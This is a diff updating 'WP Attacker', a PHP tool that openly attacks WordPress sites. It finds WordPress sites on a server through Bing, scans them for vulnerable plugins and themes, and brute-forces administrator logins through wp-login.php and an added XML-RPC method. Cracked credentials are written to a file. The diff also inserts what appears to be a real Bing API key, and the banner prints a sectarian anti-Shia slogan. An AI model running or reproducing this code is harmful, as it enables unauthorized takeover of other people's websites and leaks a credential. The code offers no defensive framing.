@@ -15,25 +15,28 @@
     ██║ █╗ ██║██████╔╝    ███████║   ██║      ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝
     ██║███╗██║██╔═══╝     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
     ╚███╔███╔╝██║         ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
-     ╚══╝╚══╝ ╚═╝         ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ THIRD VERSION
+     ╚══╝╚══╝ ╚═╝         ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ FORTH VERSION
     
-    WP Attacker v3 © Group XP 2014
+    WP Attacker v4 © Group XP 2014
     
     Coder : Hannibal Ksa (@r00t3rz)
-    Home  : alm3refh.com
+    Home  : alm3refh.com, sec4ever.com
+    
     
     What's WP Attacker:
     - Scan the server's websites, and filter the ones that are using WorePress (Using Bing search engin [API]).
-    - Get All the possible plugins and themese, which are vulnerable (Using a list).
-    - BruteForce each website that uses Wordpress (Using a correct username and a passwords list). *NEW* *BETA*
-    - Get All the possible plugins, which are vulnerable (Using security dbs). *NEW* *BETA*
-    - Exploit 'em (With the vulnerable that has been found). *UNDERGROUND*
+    - Get All the possible plugins and themese, which are vulnerable (Using a list). *UPDATED*
+    - BruteForce each website that uses Wordpress (Using a correct username and a passwords list).
+    - BruteForce each website that uses Wordpress (via XMLRPC's file using a correct username). *NEW*
+    - Get All the possible plugins and themes, which are vulnerable (Using security dbs). *UPDATED*
+    - Exploit 'em (Using more than 20 new/0day exploits). *UNDERGROUND*
     
     Why WP Attacker?
     - Using Bing API, Which leads to faster & guaranteed responde.
     - User can use his own 0day exploits.
+    - BruteForce with two methods/ways.
     - List can be updated by the user.
-    - Simple and easy.
+    - Fast, simple and easy.
     
     # In a simple word, it is an "Automatic WP Exploiter".
     
@@ -74,7 +77,7 @@ function banner(){
     $bannerone .="\n\t | | /| / / _ \  / _ /_  __/_  __/ _ |/ ___/ //_/ __/ _ \\";
     $bannerone .="\n\t | |/ |/ / ___/ / __ |/ /   / / / __ / /__/ ,< / _// , _/";
     $bannerone .="\n\t |__/|__/_/    /_/ |_/_/   /_/ /_/ |_\___/_/|_/___/_/|_| \n";
-    $bannerone .="\n\t\t    WP Attacker v3 - By Hannibal Ksa\n\n\n";
+    $bannerone .="\n\t\t    WP Attacker v4 - By Hannibal Ksa\n\n\n";
     #####################
     ##  SECOND BANNER  ##
     #####################
@@ -86,7 +89,7 @@ function banner(){
     $bannertwo .="\n\t\ \((_)/ /| _ \   (_)_\(_) |_| |_((_)_ ((_) |(_|_))  ((_) ";
     $bannertwo .="\n\t \ \/\/ / |  _/    / _ \ |  _|  _/ _` / _|| / // -_)| '_| ";
     $bannertwo .="\n\t  \_/\_/  |_|     /_/ \_\ \__|\__\__,_\__||_\_\\\\___||_|   \n";
-    $bannertwo .="\n\t\t    WP Attacker v3 - By Hannibal Ksa\n\n\n";
+    $bannertwo .="\n\t\t    WP Attacker v4 - By Hannibal Ksa\n\n\n";
     ####################
     ##  THIRD BANNER  ##
     ####################
@@ -94,7 +97,7 @@ function banner(){
     $bannerthr .="\n\t| | | |  _  |  |  _  | |_| |_ ___ ___| |_ ___ ___ ";
     $bannerthr .="\n\t| | | |   __|  |     |  _|  _| .'|  _| '_| -_|  _|";
     $bannerthr .="\n\t|_____|__|     |__|__|_| |_| |__,|___|_,_|___|_|  \n";
-    $bannerthr .="\n\t\t WP Attacker v3 - By Hannibal Ksa\n\n\n";
+    $bannerthr .="\n\t\t WP Attacker v4 - By Hannibal Ksa\n\n\n";
     #####################
     ##  FOURTH BANNER  ##
     #####################
@@ -104,7 +107,7 @@ function banner(){
     $bannerfor .="\n\t| |/\| |  __/  |  _  | __| __/ _` |/ __| |/ / _ \ '__|";
     $bannerfor .="\n\t\  /\  / |     | | | | |_| || (_| | (__|   <  __/ |   ";
     $bannerfor .="\n\t \/  \/\_|     \_| |_/\__|\__\__,_|\___|_|\_\___|_|   \n";
-    $bannerfor .="\n\t\t    WP Attacker v3 - By Hannibal Ksa\n\n\n";
+    $bannerfor .="\n\t\t    WP Attacker v4 - By Hannibal Ksa\n\n\n";
     ####################
     ##  FIFTH BANNER  ##
     ####################
@@ -114,7 +117,7 @@ function banner(){
     $bannerfiv .="\n\t██║███╗██║██╔═══╝     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗";
     $bannerfiv .="\n\t╚███╔███╔╝██║         ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║";
     $bannerfiv .="\n\t ╚══╝╚══╝ ╚═╝         ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n";
-    $bannerfiv .="\t\t\t\t WP Attacker v3 - By Hannibal Ksa\n\n\n";
+    $bannerfiv .="\t\t\t\t WP Attacker v4 - By Hannibal Ksa\n\n\n";
     #########################################
     ##   GET A RANDOME BANNER & PRINT IT   ##
     ##         METASPLOIT SWAG :-P         ##
@@ -135,7 +138,7 @@ function noblackhat(){
     print "\n\t|                        |_|ALM3REFH.com       |";
     print "\n\t|                                              |";
     print "\n\t+----------------------------------------------+";
-    print "\n\t|       WP Attacker v3 - By Hannibal Ksa       |";
+    print "\n\t|       WP Attacker v4 - By Hannibal Ksa       |";
     print "\n\t+----------------------------------------------+\n\n";
     print "\n\t\t    !! NO SHIA / ONLY SUNNAH !!\n\n";
     ###########################
@@ -156,7 +159,7 @@ function bing_it($hk){
     ##   REPLACE [ $account_key ] VALUE WITH YOUR [ BING API ACCOUNT KEY ]   ##
     ##  MORE INFO [ https://datamarket.azure.com/dataset/bing/search ]       ##
     ###########################################################################
-    $account_key = 'YOUR-ACCOUNT-KEY-HERE';
+    $account_key = 'FvQNhc+xEFUlSM7nMCqy7U627Oi4MiAnwK+X/oWhPGk';
     $query = $hk;
     $url = "https://api.datamarket.azure.com/Bing/Search/v1/Web?Query=".urlencode("'$query'")."&\$format=json";
     $ch = curl_init();
@@ -229,53 +232,76 @@ function wp_em($list){
     $lines = array_unique($lines);
     file_put_contents('wp.txt', implode($lines));
 }
-function xp_scanner($target,$list){
+function xp_scanner($target, $list, $key = NULL){
     ##########################################################
-    ##   PLUGINS AND THEMESE SCANNER PULBLIC/FIRST VERSION  ##
+    ##   PLUGINS AND THEMESE SCANNER SECOND/PUBLIC VERSION  ##
     ##########################################################
     ##  LIST FORMAT:  NAME:PATH:KEYWORD                     ##
     ##  EXAMPLE:  xp:wp-content/plugins/xp/xp.php:Group-XP  ##
     ##########################################################
+    ##  NAME IS REQUIRED (*)                                ##
+    ##  PATH IS REQUIRED (*)                                ##
+    ##  KEYWORD IS OPTIONAL (?)                             ##
+    ##########################################################
     $file = file_get_contents($list);
     $plugins = explode("\n", $file);
     #print "\n\n[ Testing $target with ".count($plugins)." Plugins/Themes ]\n";
-    foreach($plugins as $plugin){
-        /*
-        #####################
-        ##   GET HEADERS   ##
-        #####################
-        $target = $target.'/'.$x[1];
-        $check = @get_headers($target);
-        if(@preg_match("/OK/",$check[0]))  {
-            print "\n\t[!] FOUND $x[0] -> $target";
+    if($key == NULL){
+        foreach($plugins as $plugin){
+            #####################
+            ##   GET HEADERS   ##
+            #####################
+            $x = explode(":", $plugin);
+            $target = $target.'/'.$x[1];
+            $check = @get_headers($target);
+            if(eregi("200",$check[0])){
+                ####################
+                ##  PLUGIN FOUND  ##
+                ####################
+                print "\n\t[!] FOUND $x[0] -> $target";
+                /*
+                #############
+                ## SAVE IT ##
+                #############
+                $data = $target." -> ".$x[0]."\n";
+                $filename = 'vuln.txt';
+                $fp = fopen($filename, "a+");
+                $write = fputs($fp, $data);
+                fclose($fp);
+                */
+            }#else { print "\n\t[-] NOT FOUND $x[0] -> $target"; }
         }
-        */
-        $x = explode(":", $plugin);
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $target.'/'.$x[1]);
-        curl_setopt($ch, CURLOPT_HEADER, 0);
-        curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
-        $result = curl_exec($ch);
-        curl_exec($ch);
-        curl_close($ch);
-        #if(!preg_match("404", $result) or !preg_match("not found", $result)){
-        if(preg_match("#".$x[2]."#", $result)){
-            ####################
-            ##  PLUGIN FOUND  ##
-            ####################
-            print "\n\t[!] FOUND $x[0] -> $target";
-            /*
-            #############
-            ## SAVE IT ##
-            #############
-            $data = $target." -> ".$x[0]."\n";
-            $filename = 'vuln.txt';
-            $fp = fopen($filename, "a+");
-            $write = fputs($fp, $data);
-            fclose($fp);
-            */
-        } #else { print "\n\t[-] NOT FOUND $x[0] -> $target"; }
+    }else{
+        foreach($plugins as $plugin){
+            #####################
+            ##   GET KEYWORD   ##
+            #####################
+            $x = explode(":", $plugin);
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $target.'/'.$x[1]);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
+            $result = curl_exec($ch);
+            curl_exec($ch);
+            curl_close($ch); 
+            if(preg_match("#".$x[2]."#", $result)){
+                ####################
+                ##  PLUGIN FOUND  ##
+                ####################
+                print "\n\t[!] FOUND $x[0] -> $target";
+                /*
+                #############
+                ## SAVE IT ##
+                #############
+                $data = $target." -> ".$x[0]."\n";
+                $filename = 'vuln.txt';
+                $fp = fopen($filename, "a+");
+                $write = fputs($fp, $data);
+                fclose($fp);
+                */
+            } #else { print "\n\t[-] NOT FOUND $x[0] -> $target"; }
+        }
     }
 }
 function xp_get_plugins($target){
@@ -297,7 +323,33 @@ function xp_get_plugins($target){
     #    print "No Plugin was found.";
     #}
     foreach($plugins as $found){
-        #print "\n\n$plugin\n\n";
+        #print "\n\n$found\n\n";
+        #################
+        ##  SEARCH IT  ##
+        #################
+        xp_scanner_db($target, $found);
+    }
+}
+function xp_get_themes($target){
+    #########################
+    ##   GET ALL PLUGINS   ##
+    #########################
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $target);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch,CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 
+    $result = curl_exec($ch);
+    curl_exec($ch);
+    curl_close($ch);
+    preg_match_all("#/wp-content/themes/(.*?)/#i", $result, $theme);
+    $themes = array_unique($theme[1]);
+    #if(count($plugins)==0){
+    #    print "No Plugin was found.";
+    #}
+    foreach($themes as $found){
+        #print "\n\n$found\n\n";
         #################
         ##  SEARCH IT  ##
         #################
@@ -310,9 +362,9 @@ function xp_scanner_db($target, $plugin){
     #######################################################################
     ##  THIS VERSION ONLY CHECKS  ##
     ## - WORDPRESSEXPLOIT.COM     ##
-    ## - EXPLOIT-DB.COM     ##
+    ## - EXPLOIT-DB.COM           ##
     ################################
-    $wpexploit = "http://www.wordpressexploit.com/";
+    $wpexploit = array("http://www.wordpressexploit.com/", );
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $wpexploit);
     curl_setopt($ch, CURLOPT_HEADER, 0);
@@ -337,7 +389,7 @@ function xp_scanner_db($target, $plugin){
         fclose($fp);
     }
 }
-function xp_get_user($target,$list){
+function xp_get_user($target,$list, $xmlrpc = NULL){
     ####################################
     ##     GET WORDPRESS USERNAME     ##
     ##  A SIMPLE ONE BUT WOTH A SHOT  ##
@@ -352,12 +404,19 @@ function xp_get_user($target,$list){
     $result = curl_exec($ch);
     curl_exec($ch);
     curl_close($ch);
-    preg_match('|<title>(.*?)<\/title>|', $result, $username);
+    preg_match('#<title>(.*?)</title>#', $result, $username);
     $account = explode('|', $username[1]);
-    ################################################
-    ##  START BRUTE FORCE WITH THE ADMIN ACCOUNT  ##
-    ################################################
-    return xp_brute($target,$account,$list);
+    if($xmlrpc == NULL){
+        ###########################################################
+        ##  START BRUTE FORCE WITH THE ADMIN ACCOUNT / NORMAL BF ##
+        ###########################################################
+        return xp_brute($target,$account[0],$list);
+    }else {
+        ###########################################################
+        ##  START BRUTE FORCE VIA XMLRPC WITH THE ADMIN ACCOUNT  ##
+        ###########################################################
+        return xp_brute_xmlrpc($target,$account[0],$list);
+    }
 }
 function xp_brute($target,$user,$list){
     ###########################################
@@ -369,27 +428,32 @@ function xp_brute($target,$user,$list){
     ###########################################
     $file = file_get_contents($list);
     $passwords = explode("\n", $file);
+    $target = trim($target);
+    $user = trim($user);
     print "\n\n[ Testing $target ($user) with (".count($passwords).") Passwords ]\n";
     foreach($passwords as $password){
-        $target = trim($target);
-        $password = trim($password);
-        $user = trim($user);
         #############################
         ##  TESTING EACH PASSWORD  ##
         #############################
+        $redirect = $taregt."/wp-admin/";
         $curl = curl_init();
         curl_setopt($curl,CURLOPT_URL, $target."/wp-login.php");
+        curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');
         curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
         curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
+        curl_setopt($curl,CURLOPT_TIMEOUT,10);
+        curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
         curl_setopt($curl,CURLOPT_COOKIEJAR, getcwd()."./wp-cookie.txt");
         curl_setopt($curl,CURLOPT_COOKIEFILE, getcwd()."./wp-cookie.txt");
-        curl_setopt($curl,CURLOPT_POSTFIELDS, "log=$user&pwd=$password&wp-submit=Log+In&redirect_to=./wp-admin/&testcookie=1");
+        $urlencode = urlencode("Log+In&redirect_to=$redirect&testcookie=1");
+        curl_setopt($curl,CURLOPT_POSTFIELDS, "log=$user&pwd=$password&rememberme=forever&wp-submit=$urlencode");
         $result = curl_exec($curl);
+        curl_close($curl);
         ##########################
         ##  CHECK IF IT WORKED  ##
         ##########################
-        if(preg_match('/<div id="screen-meta" class="metabox-prefs">/', $result)){
-            print "\n\n\t[!] Cracked $target -> [ $user:$password ]\n\n";
+        if(strstr($result, 'tab-panel-overview')){
+            print "\n\t[!] Cracked $target -> [ $user:$password ]\n";
             ###############
             ##  SAVE IT  ##
             ###############
@@ -399,6 +463,78 @@ function xp_brute($target,$user,$list){
             $write = fputs($fp, $data."\n");
             fclose($fp);
             break;
+        }else{ print "\n[+] Trying $user:$password"; }
+    }
+}
+function xp_check_xmlrpc($target){
+    $target = $target."/xmlrpc.php";
+    $check = @get_headers($target);
+    if(eregi("200",$check[0])){
+        return 1;
+    }else{
+        return 0;
+    }
+}
+function xp_brute_xmlrpc($target,$user,$list){
+    ######################################################
+    ##   BRUTE FORCE VIA XMLRPC PULBLIC/FIRST VERSION   ##
+    ######################################################
+    ##  PASSWORDS LIST FORMAT:  PASSWORD\n              ##
+    ##  EXAMPLE:  12345\np4ssw0rd                       ##
+    ##  ( \n = NEW LINE )                               ##
+    ######################################################
+    $target = trim($target);
+    $user = trim($user);
+    if(xp_check_xmlrpc($target) != 1){
+        print "\n[!] Couldn't find xmlrpc.php in $target\n";
+        break;
+    }else{
+        $file = file_get_contents($list);
+        $passwords = explode("\n", $file);
+        print "\n\n[ Testing $target ($user) with (".count($passwords).") Passwords ]\n";
+        foreach($passwords as $password){
+            $password = trim($password);
+            $headers = array('Content-Type: application/x-www-form-urlencoded');
+            $isadmin = '<name>isAdmin</name>';
+            #############################
+            ##  TESTING EACH PASSWORD  ##
+            #############################
+            $data = "
+            <methodCall>
+                <methodName>wp.getUsersBlogs</methodName>
+                <params>
+                <param><value><string>$user</string></value></param>
+                <param><value><string>$password</string></value></param>
+            </params></methodCall>
+            ";
+            $curl = curl_init();
+            curl_setopt($curl,CURLOPT_URL, $target."/xmlrpc.php");
+            curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');
+            curl_setopt($curl,CURLOPT_HTTPHEADER,$headers);
+            curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+            curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
+            curl_setopt($curl,CURLOPT_TIMEOUT,10);
+            curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
+            curl_setopt($curl,CURLOPT_COOKIEJAR, getcwd()."./wp-cookie.txt");
+            curl_setopt($curl,CURLOPT_COOKIEFILE, getcwd()."./wp-cookie.txt");
+            curl_setopt($curl,CURLOPT_POSTFIELDS, $data);
+            $result = curl_exec($curl);
+            curl_close($curl);
+            ##########################
+            ##  CHECK IF IT WORKED  ##
+            ##########################
+            if(strstr($result, $isadmin)){
+                print "\n\t[!] Cracked $target -> [ $user:$password ]\n";
+                ###############
+                ##  SAVE IT  ##
+                ###############
+                $data = "\n[!] Cracked $target -> [ $user:$password ]";
+                $filename = 'cracked.txt';
+                $fp = fopen($filename, "a+");
+                $write = fputs($fp, $data."\n");
+                fclose($fp);
+                break;
+            }else{ print "\n[+] Trying $user:$password"; }
         }
     }
 }
@@ -495,9 +631,10 @@ foreach($get as $hk){
 ##   GIVE ME AN OPTION   ##
 ###########################
 print "\n\n\n[1] PLUGINS/THEMES SCANNER. (FROM A LIST)\n[2] PLUGINS SCANNER. (FROM A SECURITY DBS)\n[3] BRUTE FORCE.\n[4] EXIT/QUIT.\n\n";
-print "\nWHAT WOULD YOU LIKE TO DO ? [1,2,3] : ";
+print "\nWHAT WOULD YOU LIKE TO DO ? [1,2,3,4] : ";
 $what = trim(fgets(STDIN));
 $choice = array("1","2","3","4");
+$yesno = array("y","yes");
 if(in_array($what, $choice)){
     if($what == "1"){
         print "\nNP, WHERE IS YOUR LIST FOR PLUGINS/THEMES? [ex: hk.txt] : ";
@@ -521,9 +658,16 @@ if(in_array($what, $choice)){
         print "\n[-] [".count($plugins)."] Plugins/Themes have been loaded\n";
         $targets = file_get_contents('wp.txt');
         $r00t3rz = explode("\n", $targets);
+        print "\nWant to use a keyword (or use headers respond) ? [Y/n]: ";
+        $key = strtolower(trim(fgets(STDIN)));
+        if(in_array($key, $yesno)){
+            $key = "set";
+        }else{
+            $key = NULL;
+        }
         foreach($r00t3rz as $z){
             if(!$z == ""){
-                xp_scanner($z, $list);
+                xp_scanner($z, $list, $key);
             }
         }
         /*
@@ -542,7 +686,7 @@ if(in_array($what, $choice)){
         */
         bye();
     } elseif($what == "2") {
-        print "\nPLUGINS SCANNER USING ONLINE SECURITY DBS\n\n";
+        print "\nPLUGINS/THEMES SCANNER USING ONLINE SECURITY DBS\n\n";
         #################
         ##   POOYAA!   ##
         #################
@@ -552,6 +696,7 @@ if(in_array($what, $choice)){
         foreach($r00t3rz as $z){
             if(!$z == ""){
                 xp_get_plugins($z);
+                xp_get_themes($z);
             }
         }
         #################
@@ -583,12 +728,19 @@ if(in_array($what, $choice)){
         #################
         ##   POOYAA!   ##
         #################
+        print "\nWANT TO BRUTEFORCE VIA XMLRPC ? [Y/n]: ";
+        $xmlrpc = strtolower(trim(fgets(STDIN)));
+        if(in_array($xmlrpc, $yesno)){
+            $xml = "set";
+        }else{
+            $xml = NULL;
+        }
         print "\n[+] Bruting begun";
         $targets = file_get_contents('wp.txt');
         $xp = explode("\n", $targets);
         foreach($xp as $z){
             if(!$z == ""){
-                xp_get_user($z, $list);
+                xp_get_user($z, $list, $xml);
             }
         }
         bye();
